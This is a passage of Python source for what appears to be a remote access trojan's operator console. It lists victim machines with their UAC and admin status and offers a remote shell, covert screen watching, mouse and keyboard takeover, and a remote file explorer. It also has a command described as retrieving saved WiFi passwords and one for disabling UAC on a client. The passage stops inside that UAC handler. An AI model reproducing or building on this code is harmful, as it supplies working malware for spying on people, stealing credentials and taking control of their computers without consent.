import socket
import threading
import datetime
import os
import shutil
import base64
import tkinter
from tkinter import ttk, messagebox

import cv2
import numpy as np
import shlex
import customtkinter

from tkinterdnd2 import DND_FILES, TkinterDnD
import tkinterdnd2
import json
import getpass
import queue
import time
import random
import string
from pathlib import Path

PROMPT = "admin> "

# --- Configuration ---
# This console connects to the central server.
SERVER_IP = "127.0.0.1"
ADMIN_PORT = 4131

# The base port for starting to look for free ports for video streams.
BASE_STREAM_PORT = 3132
# ---------------------

# --- Globals ---
message_queue = queue.Queue()
IS_SUPERADMIN = False
ACTIVE_EXPLORERS = {}
ROOT = None # Will hold the main CTk window
command_finished_event = threading.Event()
# ---------------
HEADER_LENGTH = 10

def send_json(sock, data):
    """Serializes data to JSON, prefixes with a header, and sends."""
    try:
        message = json.dumps(data)
        message_bytes = message.encode('utf-8')
        header = f"{len(message_bytes):<{HEADER_LENGTH}}".encode('utf-8')
        sock.sendall(header + message_bytes)
        return True
    except (ConnectionResetError, BrokenPipeError):
        return False

def receive_json(sock):
    """Receives a JSON message with a fixed-size header."""
    try:
        header = sock.recv(HEADER_LENGTH)
        if not header:
            return None
        message_length = int(header.decode('utf-8').strip())
        
        chunks = []
        bytes_recd = 0
        while bytes_recd < message_length:
            chunk = sock.recv(min(message_length - bytes_recd, 4096))
            if not chunk:
                return None
            chunks.append(chunk)
            bytes_recd += len(chunk)
        
        return json.loads(b''.join(chunks).decode('utf-8'))
    except (ValueError, ConnectionResetError, BrokenPipeError, json.JSONDecodeError):
        return None

def receive_frame(sock):
    """Receives a frame with a monitor index and a length header."""
    try:
        monitor_header = sock.recv(1)
        if not monitor_header:
            return None, None
        monitor_index = int.from_bytes(monitor_header, 'big')

        header = sock.recv(HEADER_LENGTH)
        if not header:
            return None, None
        
        message_length = int(header.decode('utf-8').strip())
        
        chunks = []
        bytes_recd = 0
        while bytes_recd < message_length:
            # Use a larger buffer for receiving image data
            chunk = sock.recv(min(message_length - bytes_recd, 65536))
            if not chunk:
                return None, None # Connection broken
            chunks.append(chunk)
            bytes_recd += len(chunk)
        
        return monitor_index, b''.join(chunks)
    except (ValueError, ConnectionResetError, BrokenPipeError, IndexError):
        return None, None

class StreamViewer(threading.Thread):
    def __init__(self, client_id, port):
        super().__init__()
        self.client_id = client_id
        self.port = port
        self.daemon = True
        self._stop_event = threading.Event()

    def stop(self):
        self._stop_event.set()

    def cleanup(self, windows, listener, conn):
        """Clean up windows and sockets."""
        for win_name in windows:
            try:
                cv2.destroyWindow(win_name)
            except:
                pass
        if conn:
            conn.close()
        if listener:
            listener.close()

    def run(self):
        windows = {}
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        conn = None
        try:
            # Bind to 0.0.0.0 to accept connections from any interface
            listener.bind(('0.0.0.0', self.port))
            listener.listen(1)
            listener.settimeout(10) # Timeout for client to connect
            conn, _ = listener.accept()

            while not self._stop_event.is_set():
                monitor_index, frame_bytes = receive_frame(conn)
                if frame_bytes is None:
                    break # Client disconnected stream

                frame = np.frombuffer(frame_bytes, dtype=np.uint8)
                img = cv2.imdecode(frame, cv2.IMREAD_COLOR)
                if img is None: continue

                win_name = f"Client {self.client_id} - Monitor {monitor_index}"
                if win_name not in windows:
                    windows[win_name] = True
                    cv2.namedWindow(win_name, cv2.WINDOW_NORMAL)

                cv2.imshow(win_name, img)
                if cv2.waitKey(1) & 0xFF == ord('q'): break
                if any(cv2.getWindowProperty(name, cv2.WND_PROP_VISIBLE) < 1 for name in windows): break
        except (socket.timeout, OSError):
            print(f"\n[!] Client {self.client_id} failed to connect to stream port.")
        finally:
            self.cleanup(windows, listener, conn)


class ControlViewer(threading.Thread):
    def __init__(self, client_id, stream_port, control_port):
        super().__init__()
        self.client_id = client_id
        self.stream_port = stream_port
        self.control_port = control_port
        self.daemon = True
        self._stop_event = threading.Event()
        self.control_conn = None
        self.window_name = f"Controlling Client {self.client_id}"
        self.key_map = {
            13: 'enter', 8: 'backspace', 9: 'tab', 27: 'esc',
            # Special keys that don't have a simple ASCII representation
            # Note: Arrow keys, function keys, etc., produce multi-byte sequences
            # that are harder to capture with cv2.waitKey. This is a limitation.
        }

    def stop(self):
        self._stop_event.set()

    def send_control_event(self, event):
        if self.control_conn and not self._stop_event.is_set():
            try:
                # Send as newline-terminated JSON
                self.control_conn.sendall((json.dumps(event) + '\n').encode('utf-8'))
                return True
            except (BrokenPipeError, ConnectionResetError):
                self.stop()
        return False

    def mouse_callback(self, event, x, y, flags, param):
        try:
            # Get current window dimensions for normalization
            _, _, width, height = cv2.getWindowImageRect(self.window_name)
            if width <= 1 or height <= 1: return # Avoid division by zero on minimized window
        except cv2.error:
            return # Window was likely closed

        nx, ny = max(0.0, min(1.0, x / width)), max(0.0, min(1.0, y / height))
        event_data = {"x": nx, "y": ny}
        
        event_map = {
            cv2.EVENT_MOUSEMOVE: {"type": "mousemove"},
            cv2.EVENT_LBUTTONDOWN: {"type": "mousedown", "button": "left"},
            cv2.EVENT_LBUTTONUP: {"type": "mouseup", "button": "left"},
            cv2.EVENT_RBUTTONDOWN: {"type": "mousedown", "button": "right"},
            cv2.EVENT_RBUTTONUP: {"type": "mouseup", "button": "right"},
            cv2.EVENT_MBUTTONDOWN: {"type": "mousedown", "button": "middle"},
            cv2.EVENT_MBUTTONUP: {"type": "mouseup", "button": "middle"},
            cv2.EVENT_MOUSEWHEEL: {"type": "scroll", "dx": 0, "dy": 1 if flags > 0 else -1},
        }

        if event in event_map:
            event_data.update(event_map[event])
            self.send_control_event(event_data)

    def cleanup(self, stream_listener, control_listener, stream_conn):
        """Clean up windows and sockets."""
        if self.control_conn: self.control_conn.close()
        if stream_conn: stream_conn.close()
        if control_listener: control_listener.close()
        if stream_listener: stream_listener.close()
        try: cv2.destroyWindow(self.window_name)
        except: pass

    def run(self):
        stream_listener, control_listener, stream_conn = None, None, None
        try:
            stream_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            stream_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            stream_listener.bind(('0.0.0.0', self.stream_port))
            stream_listener.listen(1)

            control_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            control_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            control_listener.bind(('0.0.0.0', self.control_port))
            control_listener.listen(1)

            stream_listener.settimeout(15); control_listener.settimeout(15)
            stream_conn, _ = stream_listener.accept()
            self.control_conn, _ = control_listener.accept()

            cv2.namedWindow(self.window_name, cv2.WINDOW_NORMAL)
            cv2.setMouseCallback(self.window_name, self.mouse_callback)

            while not self._stop_event.is_set():
                _, frame_bytes = receive_frame(stream_conn)
                if frame_bytes is None: break
                frame = np.frombuffer(frame_bytes, dtype=np.uint8)
                img = cv2.imdecode(frame, cv2.IMREAD_COLOR)
                if img is not None: cv2.imshow(self.window_name, img)

                key = cv2.waitKey(1) & 0xFF
                if key != 255: self.handle_key_press(key)
                if cv2.getWindowProperty(self.window_name, cv2.WND_PROP_VISIBLE) < 1: break
        except (socket.timeout, OSError):
            print(f"\n[!] Client {self.client_id} failed to connect to control/stream ports.")
        finally:
            self.stop()
            self.cleanup(stream_listener, control_listener, stream_conn)

    def handle_key_press(self, key):
        if key == ord('q'):
            self.stop()
            return

        key_str = self.key_map.get(key) or (chr(key) if 32 <= key <= 126 else None)
        if key_str:
            # Send key down and key up immediately for simplicity
            self.send_control_event({"type": "keydown", "key": key_str})
            self.send_control_event({"type": "keyup", "key": key_str})

def start_session(sock, client_id):
    print(f"[+] Starting session with client {client_id}. Type 'exit' to return.")

    while True:
        try:
            cmd = input(f"shell@{client_id}> ")
            if cmd.strip().lower() == 'exit':
                break
            if not cmd.strip():
                continue

            request = {"action": "exec", "client_id": client_id, "payload": cmd}
            if not send_json(sock, request):
                print("\n[-] Connection to server lost.")
                break

            # Wait for a response specifically for this command
            while True:
                response = message_queue.get()
                if response is None: # Connection lost
                    print("\n[-] Connection to server lost.")
                    return

                if response.get("type") == "response" and response.get("client_id") == client_id:
                    print(response.get("data", ""), end='')
                    break # Got our response, break inner loop to get next command
                elif response.get("type") == "error":
                    print(f"[!] Server Error: {response.get('message')}")
                    if "not found" in response.get('message', '') or "disconnected" in response.get('message', ''):
                        return # Exit session
                    break
                elif response.get("type") == "task_status":
                    # An async message arrived during our session. Print it and keep waiting.
                    print(f"\n[+] Status from client {response.get('client_id')}: {response.get('message')}")
                    print(f"shell@{client_id}> ", end="", flush=True)

        except KeyboardInterrupt:
            print("\n[!] Session interrupted. Type 'exit' to return to main menu.")
            break # Exit the session loop

def find_free_port(start_port):
    port = start_port
    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            # Check for a free port on the local machine
            if s.connect_ex(('127.0.0.1', port)) != 0:
                return port
        port += 1

def start_watch_session(sock, client_id, fps, quality, no_cursor):
    port = find_free_port(BASE_STREAM_PORT)
    viewer_thread = StreamViewer(client_id, port)

    request = {
        "action": "initiate_watch",
        "client_id": client_id,
        "stream_port": port,
        "fps": fps,
        "quality": quality,
        "capture_cursor": not no_cursor
    }

    if send_json(sock, request):
        print(f"[+] Instructing client {client_id} to start streaming on port {port}...")
        print("[+] A new window will appear. Close the window or press 'q' to stop.")
        viewer_thread.start()
        # We don't wait for a response here, just assume it worked.
        # The StreamViewer will time out if the client doesn't connect.
    else:
        print(f"[-] Failed to send watch command to server.")

def start_control_session(sock, client_id):
    stream_port = find_free_port(BASE_STREAM_PORT)
    control_port = find_free_port(stream_port + 1)
    
    viewer_thread = ControlViewer(client_id, stream_port, control_port)

    request = {
        "action": "initiate_control",
        "client_id": client_id,
        "stream_port": stream_port,
        "control_port": control_port,
    }

    if send_json(sock, request):
        print(f"[+] Instructing client {client_id} to start control session...")
        print("[+] A new window will appear. Close the window or press 'q' to stop.")
        viewer_thread.start()
    else:
        print(f"[-] Failed to send control command to server.")

class TransferManager:
    def __init__(self, gui, sock, client_id):
        self.gui = gui
        self.sock = sock
        self.client_id = client_id
        self.transfer_queue = queue.Queue()
        self.active_transfers = 0
        self.status_queue = queue.Queue()
        self.active_downloads = {}
        self.download_lock = threading.Lock()

        threading.Thread(target=self._process_queue, daemon=True).start()
        self.gui.after(100, self._check_status_queue)

    def _check_status_queue(self):
        try:
            while True:
                message, is_error = self.status_queue.get_nowait()
                self.gui.update_status(message, is_error)
        except queue.Empty:
            pass
        finally:
            self.gui.after(100, self._check_status_queue)

    def _process_queue(self):
        while True:
            transfer_type, source, dest = self.transfer_queue.get()
            self.active_transfers += 1
            if transfer_type == 'upload':
                thread = threading.Thread(target=self._upload_worker, args=(source, dest), daemon=True)
                thread.start()

    def queue_upload(self, local_path, remote_base_path):
        self.transfer_queue.put(('upload', local_path, remote_base_path))
        self.status_queue.put((f"Queued: {os.path.basename(local_path)}", False))

    def queue_download(self, remote_path, local_base_path):
        # Normalize path to use forward slashes for consistent dictionary keying.
        remote_path = remote_path.replace('\\', '/')
        filename = os.path.basename(remote_path)
        local_path = os.path.join(local_base_path, filename)

        # Check for write permissions on the target directory before proceeding.
        if not os.access(local_base_path, os.W_OK):
            messagebox.showerror("Permission Denied",
                                 f"You do not have permission to save files in this location:\n\n{local_base_path}")
            self.status_queue.put((f"Download failed: Permission denied for {local_base_path}", True))
            return

        if os.path.exists(local_path):
            if not messagebox.askyesno("Confirm Overwrite", f"'{filename}' already exists. Overwrite?"):
                self.status_queue.put((f"Download skipped: {filename}", False))
                return

        try:
            f = open(local_path, 'wb')
            with self.download_lock:
                self.active_downloads[remote_path] = f
            self.status_queue.put((f"Downloading {filename}...", False))
            send_json(self.sock, {"action": "fs_get_start", "client_id": self.client_id, "payload": {"path": remote_path}})
        except Exception as e:
            self.status_queue.put((f"Download failed for {filename}: {e}", True))

    def process_download_message(self, message):
        msg_type = message.get("type")
        payload = message.get("payload", {})
        remote_path = payload.get("path")

        if not remote_path: return

        # Normalize path separators to handle Windows client responses
        remote_path = remote_path.replace('\\', '/')

        with self.download_lock:
            if remote_path not in self.active_downloads: return
            file_handle = self.active_downloads[remote_path]
            filename = os.path.basename(remote_path)

            if msg_type == "fs_chunk":
                try:
                    data = base64.b64decode(payload.get("data", ""))
                    file_handle.write(data)
                except Exception as e:
                    self.status_queue.put((f"Error on {filename}: {e}", True))
                    file_handle.close()
                    del self.active_downloads[remote_path]
            elif msg_type == "fs_get_end":
                file_handle.close()
                del self.active_downloads[remote_path]
                self.status_queue.put((f"Download complete: {filename}", False))
                self.gui.after(0, self.gui.populate_local_tree)

    def _upload_worker(self, local_path, remote_base_path):
        try:
            if os.path.isdir(local_path):
                self._upload_directory(local_path, remote_base_path)
            else:
                self._upload_file(local_path, remote_base_path)
        except Exception as e:
            self.status_queue.put((f"Upload failed for {os.path.basename(local_path)}: {e}", True))
        finally:
            self.active_transfers -= 1

    def _upload_file(self, local_path, remote_base_path):
        filename = os.path.basename(local_path)
        remote_path = f"{remote_base_path.rstrip('/')}/{filename}"
        self.status_queue.put((f"Uploading {filename}...", False))

        send_json(self.sock, {"action": "fs_put_start", "client_id": self.client_id, "payload": {"path": remote_path}})
        with open(local_path, 'rb') as f:
            seq = 0
            while chunk := f.read(3072):
                encoded = base64.b64encode(chunk).decode('ascii')
                send_json(self.sock, {"action": "fs_put_chunk", "client_id": self.client_id, "payload": {"path": remote_path, "data": encoded, "seq": seq}})
                seq += 1
        send_json(self.sock, {"action": "fs_put_end", "client_id": self.client_id, "payload": {"path": remote_path}})

    def _upload_directory(self, local_dir_path, remote_parent_path):
        dir_name = os.path.basename(local_dir_path)
        remote_dir_path = f"{remote_parent_path.rstrip('/')}/{dir_name}"
        self.status_queue.put((f"Creating remote dir: {dir_name}", False))
        send_json(self.sock, {"action": "fs_mkdir", "client_id": self.client_id, "payload": {"path": remote_dir_path}})
        time.sleep(0.2)
        for item in os.listdir(local_dir_path):
            self.queue_upload(os.path.join(local_dir_path, item), remote_dir_path)

class FileExplorerGUI(customtkinter.CTkToplevel, TkinterDnD.DnDWrapper):
    def __init__(self, master, sock, client_id):
        super().__init__(master)
        self.sock = sock
        self.client_id = client_id
        self.title(f"File Explorer - Client {self.client_id}")
        self.geometry("1000x600")
        self.protocol("WM_DELETE_WINDOW", self.on_close)

        self.TkdndVersion = TkinterDnD._require(self)

        # --- Layout ---
        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(0, weight=1)

        self.paned_window = ttk.PanedWindow(self, orient='horizontal')
        self.paned_window.grid(row=0, column=0, sticky="nsew", padx=5, pady=5)

        # --- Local Pane ---
        local_frame = ttk.Frame(self.paned_window, padding=5)
        self.paned_window.add(local_frame, weight=1)
        local_frame.grid_columnconfigure(0, weight=1)
        local_frame.grid_rowconfigure(1, weight=1)
        ttk.Label(local_frame, text="Local System").grid(row=0, column=0, sticky='w')
        self.local_tree = ttk.Treeview(local_frame, columns=("size", "type", "modified"), show='tree headings', selectmode='extended')
        self.local_tree.heading("#0", text="Name")
        self.local_tree.heading("size", text="Size")
        self.local_tree.heading("type", text="Type")
        self.local_tree.heading("modified", text="Date Modified")
        self.local_tree.column("size", width=100, anchor='e')
        self.local_tree.column("type", width=100, anchor='w')
        self.local_tree.column("modified", width=150, anchor='w')
        self.local_tree.grid(row=1, column=0, sticky='nsew')
        self.local_path = str(Path.home())
        self.populate_local_tree()
        self.local_tree.bind("<Double-1>", self.on_local_tree_double_click)

        # --- Remote Pane ---
        remote_frame = ttk.Frame(self.paned_window, padding=5)
        self.paned_window.add(remote_frame, weight=1)
        remote_frame.grid_columnconfigure(0, weight=1)
        remote_frame.grid_rowconfigure(1, weight=1)
        self.remote_label = ttk.Label(remote_frame, text="Remote System")
        self.remote_label.grid(row=0, column=0, sticky='w')
        self.remote_tree = ttk.Treeview(remote_frame, columns=("size", "type", "modified"), show='tree headings', selectmode='extended')
        self.remote_tree.heading("#0", text="Name")
        self.remote_tree.heading("size", text="Size")
        self.remote_tree.heading("type", text="Type")
        self.remote_tree.heading("modified", text="Date Modified")
        self.remote_tree.column("size", width=100, anchor='e')
        self.remote_tree.column("type", width=100, anchor='w')
        self.remote_tree.column("modified", width=150, anchor='w')
        self.remote_tree.grid(row=1, column=0, sticky='nsew')
        self.remote_path = None # Will be set on first load
        self.remote_tree.bind("<Double-1>", self.on_remote_tree_double_click)

        # --- Context Menus ---
        self.local_context_menu = tkinter.Menu(self, tearoff=0)
        self.local_context_menu.add_command(label="Create Folder", command=self.create_local_folder)
        self.local_context_menu.add_command(label="Delete", command=self.delete_local_items)
        self.local_context_menu.add_separator()
        self.local_context_menu.add_command(label="Refresh", command=self.populate_local_tree)
        self.local_tree.bind("<Button-3>", self.show_local_context_menu)

        self.remote_context_menu = tkinter.Menu(self, tearoff=0)
        self.remote_context_menu.add_command(label="Create Folder", command=self.create_remote_folder)
        self.remote_context_menu.add_command(label="Delete", command=self.delete_remote_items)
        self.remote_context_menu.add_separator()
        self.remote_context_menu.add_command(label="Refresh", command=lambda: self.populate_remote_tree(self.remote_path))
        self.remote_tree.bind("<Button-3>", self.show_remote_context_menu)

        # --- Drag and Drop ---
        self.transfer_manager = TransferManager(self, self.sock, self.client_id)
        self.local_tree.drop_target_register(DND_FILES); self.local_tree.dnd_bind('<<Drop>>', self.on_drop_local)
        self.remote_tree.drop_target_register(DND_FILES); self.remote_tree.dnd_bind('<<Drop>>', self.on_drop_remote)
        self.local_tree.drag_source_register(1); self.local_tree.dnd_bind('<<DragInitCmd>>', self.on_drag_start_local)
        self.remote_tree.drag_source_register(1); self.remote_tree.dnd_bind('<<DragInitCmd>>', self.on_drag_start_remote)

        # --- Status Bar ---
        self.status_bar = customtkinter.CTkLabel(self, text="Ready", anchor='w')
        self.status_bar.grid(row=1, column=0, sticky='ew', padx=5, pady=2)
        self.populate_remote_drives() # Initial load

    def on_close(self):
        if self.client_id in ACTIVE_EXPLORERS:
            del ACTIVE_EXPLORERS[self.client_id]
        self.destroy()

    def update_status(self, message, is_error=False):
        self.status_bar.configure(text=message)

    def populate_local_tree(self):
        # Clear existing items
        for i in self.local_tree.get_children():
            self.local_tree.delete(i)
        
        try:
            # Parent directory entry
            self.local_tree.insert("", "end", text="[..]", values=("", "Parent Dir", ""), tags=('dir',))

            items = list(os.scandir(self.local_path))
            items.sort(key=lambda x: (not x.is_dir(), x.name.lower()))

            for item in items:
                try:
                    stat = item.stat()
                    size = f"{stat.st_size / 1024:.2f} KB" if item.is_file() else ""
                    item_type = "Folder" if item.is_dir() else "File"
                    modified = datetime.datetime.fromtimestamp(stat.st_mtime).strftime('%Y-%m-%d %H:%M:%S')
                    tags = ('dir',) if item.is_dir() else ('file',)
                    self.local_tree.insert("", "end", text=item.name, values=(size, item_type, modified), tags=tags)
                except OSError:
                    continue # Skip inaccessible files
        except Exception as e:
            self.status_bar.configure(text=f"Local Error: {e}")

    def on_local_tree_double_click(self, event):
        item_id = self.local_tree.focus()
        if not item_id: return
        item = self.local_tree.item(item_id)
        name = item['text']
        if 'dir' in item.get('tags', []):
            new_path = str(Path(self.local_path).parent) if name == "[..]" else os.path.join(self.local_path, name)
            if os.path.isdir(new_path):
                self.local_path = new_path
                self.populate_local_tree()

    def on_remote_tree_double_click(self, event):
        item_id = self.remote_tree.focus()
        if not item_id: return
        item = self.remote_tree.item(item_id)
        name = item['text']
        if 'dir' not in item.get('tags', []):
            return

        if name == "[..]":
            if self.remote_path: # Not in drive list view
                norm_path = os.path.normpath(self.remote_path)
                if os.path.dirname(norm_path) == norm_path:
                    self.populate_remote_drives()
                    return
                new_path = os.path.join(self.remote_path, "..")
                self.populate_remote_tree(new_path.replace('\\', '/'))
        else:
            # If remote_path is "", we are in the drive list view.
            base_path = self.remote_path if self.remote_path is not None else ""
            new_path = os.path.join(base_path, name)
            self.populate_remote_tree(new_path.replace('\\', '/'))

    def show_local_context_menu(self, event):
        self.local_context_menu.entryconfigure("Delete", state="normal" if self.local_tree.selection() else "disabled")
        self.local_context_menu.post(event.x_root, event.y_root)

    def show_remote_context_menu(self, event):
        self.remote_context_menu.entryconfigure("Delete", state="normal" if self.remote_tree.selection() else "disabled")
        self.remote_context_menu.post(event.x_root, event.y_root)

    def create_local_folder(self):
        dialog = customtkinter.CTkInputDialog(text="Enter folder name:", title="Create Folder")
        folder_name = dialog.get_input()
        if folder_name:
            try:
                os.mkdir(os.path.join(self.local_path, folder_name))
                self.populate_local_tree()
            except Exception as e:
                messagebox.showerror("Error", f"Failed to create folder: {e}")

    def create_remote_folder(self):
        dialog = customtkinter.CTkInputDialog(text="Enter folder name:", title="Create Folder")
        folder_name = dialog.get_input()
        if folder_name:
            remote_path = f"{self.remote_path.rstrip('/')}/{folder_name}"
            send_json(self.sock, {"action": "fs_mkdir", "client_id": self.client_id, "payload": {"path": remote_path}})

    def delete_local_items(self):
        selected = self.local_tree.selection()
        if not selected: return
        names = [self.local_tree.item(i)['text'] for i in selected]
        if messagebox.askyesno("Confirm Delete", f"Delete locally:\n\n" + "\n".join(names)):
            for item_id in selected:
                path = os.path.join(self.local_path, self.local_tree.item(item_id)['text'])
                try:
                    if os.path.isdir(path): shutil.rmtree(path)
                    else: os.remove(path)
                except Exception as e:
                    messagebox.showerror("Error", f"Failed to delete {os.path.basename(path)}: {e}")
                    break
            self.populate_local_tree()

    def delete_remote_items(self):
        selected = self.remote_tree.selection()
        if not selected: return
        names = [self.remote_tree.item(i)['text'] for i in selected]
        if messagebox.askyesno("Confirm Delete", f"Delete on remote system:\n\n" + "\n".join(names)):
            for item_id in selected:
                name = self.remote_tree.item(item_id)['text']
                remote_path = f"{self.remote_path.rstrip('/')}/{name}"
                send_json(self.sock, {"action": "fs_delete", "client_id": self.client_id, "payload": {"path": remote_path}})

    def on_drag_start_local(self, event):
        items = self.local_tree.selection()
        if not items: return
        paths = [os.path.join(self.local_path, self.local_tree.item(i)['text']) for i in items]
        return (tkinterdnd2.COPY, DND_FILES, '\0'.join(paths))

    def on_drop_remote(self, event):
        if event.data: self.transfer_manager.queue_upload(event.data.split('\0')[0], self.remote_path)

    def on_drag_start_remote(self, event):
        items = self.remote_tree.selection()
        if not items: return
        paths = [f"{self.remote_path.rstrip('/')}/{self.remote_tree.item(i)['text']}" for i in items]
        return (tkinterdnd2.COPY, DND_FILES, '\0'.join(paths))

    def on_drop_local(self, event):
        if event.data: self.transfer_manager.queue_download(event.data.split('\0')[0], self.local_path)

    def populate_remote_tree(self, path="."):
        self.status_bar.configure(text=f"Requesting listing for '{path}'...")
        request = {
            "action": "fs_list",
            "client_id": self.client_id,
            "payload": {"path": path}
        }
        send_json(self.sock, request)

    def populate_remote_drives(self):
        self.status_bar.configure(text="Requesting system drives...")
        request = {
            "action": "fs_list_drives",
            "client_id": self.client_id
        }
        send_json(self.sock, request)

    def handle_server_message(self, message):
        """Processes an incoming JSON message from the server listener thread."""
        msg_type = message.get("type")

        if msg_type in ("fs_chunk", "fs_get_end"):
            self.transfer_manager.process_download_message(message)
        elif msg_type == "fs_response":
            status = message.get("status")
            if status == "success":
                data = message.get("data", {})
                if "contents" in data: # This is a directory listing
                    self.update_remote_treeview(data)
                else: # This is a response to another action like delete/mkdir
                    self.status_bar.configure(text=message.get("message", "Operation successful."))
                    if message.get("original_action") in ("fs_delete", "fs_mkdir", "fs_put_end"):
                        self.populate_remote_tree(self.remote_path) # Refresh
            else: # Error
                error_msg = message.get("message", "Unknown error")
                self.status_bar.configure(text=f"Remote Error: {error_msg}")
        elif msg_type == "fs_drives_response":
            if message.get("status") == "success":
                drives = message.get("data", {}).get("drives", [])
                self.update_remote_treeview_with_drives(drives)

    def process_fs_response(self, message):
        """A thread-safe method to schedule message handling on the main GUI thread.
        It checks if the window still exists before processing the message."""
        if self.winfo_exists():
            self.handle_server_message(message)

    def update_remote_treeview(self, data):
        # Clear existing items
        for i in self.remote_tree.get_children():
            self.remote_tree.delete(i)

        self.remote_path = data.get("path", self.remote_path) # Keep old path on error
        self.remote_label.configure(text=f"Remote System: {self.remote_path}")
        self.status_bar.configure(text=f"Listing: {self.remote_path}")

        # Parent directory entry
        self.remote_tree.insert("", "end", text="[..]", values=("", "Parent Dir", ""), tags=('dir',))

        contents = data.get("contents", [])
        # Sort folders first, then files
        contents.sort(key=lambda x: (x['type'] != 'dir', x['name'].lower()))

        for item in contents:
            size_kb = item.get('size', 0) / 1024
            size_str = f"{size_kb:.2f} KB" if item['type'] == 'file' else ""
            modified = datetime.datetime.fromtimestamp(item.get('modified', 0)).strftime('%Y-%m-%d %H:%M:%S')
            tags = ('dir',) if item['type'] == 'dir' else ('file',)
            self.remote_tree.insert("", "end", text=item['name'], values=(size_str, item['type'].capitalize(), modified), tags=tags)

    def update_remote_treeview_with_drives(self, drives):
        # Clear existing items
        for i in self.remote_tree.get_children():
            self.remote_tree.delete(i)

        self.remote_path = "" # Special state for drive view
        self.remote_label.configure(text="Remote System: Drives")
        self.status_bar.configure(text="Displaying system drives.")

        # Sort drives alphabetically
        drives.sort()

        for drive in drives:
            self.remote_tree.insert("", "end", text=drive, values=("", "Drive", ""), tags=('dir',))

def handle_files(sock, args):
    """Opens a graphical file explorer for a client."""
    if not args or not args[0].isdigit():
        print("[-] Usage: files <client_id>")
        return
    
    client_id = int(args[0])
    if client_id in ACTIVE_EXPLORERS and ACTIVE_EXPLORERS[client_id].winfo_exists():
        print(f"[+] File explorer for client {client_id} is already open.")
        ACTIVE_EXPLORERS[client_id].lift()
        return

    print(f"[+] Opening file explorer for client {client_id}...")
    # The mainloop is handled by the root window created in main()
    explorer = FileExplorerGUI(ROOT, sock, client_id)
    ACTIVE_EXPLORERS[client_id] = explorer

def listen_for_server_messages(sock):
    """Dedicated thread to continuously receive messages from the server."""
    while True:
        response = receive_json(sock)
        if response is None:
            print("\n[-] Connection to server lost. Please restart the console.")
            message_queue.put(None) # Signal other threads
            for explorer in ACTIVE_EXPLORERS.values():
                explorer.destroy()
            os._exit(1)

        # Route message to the correct handler
        msg_type = response.get("type", "")
        client_id = response.get("client_id")

        if msg_type.startswith("fs_") and client_id in ACTIVE_EXPLORERS:
            explorer = ACTIVE_EXPLORERS[client_id]
            # Schedule the GUI update on the main thread, including the existence check
            explorer.after(0, explorer.process_fs_response, response)
        else:
            # Put other messages on the queue for synchronous commands
            message_queue.put(response)

def handle_help(sock, args):
    """Displays available commands."""
    global IS_SUPERADMIN
    print("\n--- Available Commands ---")
    for cmd, info in COMMANDS.items():
        if cmd == 'admins' and not IS_SUPERADMIN:
            continue
        print(f"{cmd:<25} {info.get('description', '')}")
    print("--------------------------\n")

def handle_list(sock, args):
    """Requests and displays the list of active clients."""
    if not send_json(sock, {"action": "list"}):
        print("[-] Connection to server lost.")
        return
    
    response = message_queue.get(timeout=5)
    if response and response.get("type") == "list_response":
        clients = response.get("data", [])
        if not clients:
            print("[-] No active clients connected to the server.")
            return
        
        print("\n--- Active Clients ---")
        print(f"{'ID':<4} | {'Address':<21} | {'Username':<15} | {'Admin':<7} | UAC Status")
        print("-" * 72)
        for client in clients:
            is_admin_val = client.get('is_admin')
            if is_admin_val is True:
                admin_str = "Yes"
            elif is_admin_val is False:
                admin_str = "No"
            else:
                admin_str = "..."
            print(f"{client['id']:<4} | {client['addr']:<21} | {client.get('username', 'N/A'):<15} | {admin_str:<7} | {client.get('uac_status', 'N/A')}")
        print("-" * 72 + "\n")
    else:
        print("[-] Failed to retrieve client list from server.")

def handle_session(sock, args):
    """Starts an interactive shell session with a client."""
    if len(args) > 0 and args[0].isdigit():
        start_session(sock, int(args[0]))
    else:
        print("[-] Usage: session <client_id>")

def handle_watch(sock, args):
    """Starts a screen watch session with a client."""
    import argparse # Keep argparse local to this handler
    parser = argparse.ArgumentParser(prog='watch', description='Start a screen watch session.')
    parser.add_argument('client_id', type=int, help='The ID of the client to watch.')
    parser.add_argument('--fps', type=int, default=30, help='Frames per second for the stream.')
    parser.add_argument('--quality', type=int, default=70, help='JPEG quality (1-100).')
    parser.add_argument('--no-cursor', action='store_true', help='Do not capture the mouse cursor.')
    try:
        parsed_args = parser.parse_args(args)
        start_watch_session(sock, parsed_args.client_id, parsed_args.fps, parsed_args.quality, parsed_args.no_cursor)
    except SystemExit: # argparse calls exit on --help or error
        pass

def handle_control(sock, args):
    """Starts a remote control session with a client."""
    if len(args) > 0 and args[0].isdigit():
        start_control_session(sock, int(args[0]))
    else:
        print("[-] Usage: control <client_id>")

def handle_netinfo(sock, args):
    """Retrieves saved WiFi profiles and passwords from a client."""
    if len(args) > 0 and args[0].isdigit():
        client_id = int(args[0])
        request = {"action": "get_network_info", "client_id": client_id}
        print(f"[+] Requesting network details from client {client_id}...")
        if not send_json(sock, request):
            print("[-] Connection to server lost.")
            return
        
        # Wait for a response specifically for this command
        while True:
            try:
                # Use a timeout to prevent indefinite blocking
                response = message_queue.get(timeout=35) 
                if response is None: # Connection lost
                    print("\n[-] Connection to server lost.")
                    return

                if response.get("type") == "response" and response.get("client_id") == client_id:
                    print(f"\n--- Network Details for Client {client_id} ---")
                    print(response.get("data", "[!] No data received."))
                    print("------------------------------------------\n")
                    break 
                elif response.get("type") == "error":
                    print(f"\n[!] Server Error: {response.get('message')}\n")
                    break
                elif response.get("type") == "task_status":
                    # An async message arrived during our wait. Print it and keep waiting.
                    print(f"\n[+] Status from client {response.get('client_id')}: {response.get('message')}")
                    print(PROMPT, end="", flush=True)
            except queue.Empty:
                print(f"\n[!] Timed out waiting for network details from client {client_id}.\n")
                break
    else:
        print("[-] Usage: netinfo <client_id>")

def handle_uac(sock, args):
    """Enables or disables UAC on a client."""
    if len(args) != 2 or args[0].lower() not in ['enable', 'disable']:
        print("[-] Usage: uac <enable|disable> <client_id>")
        return

    level = args[0].lower()
    try:
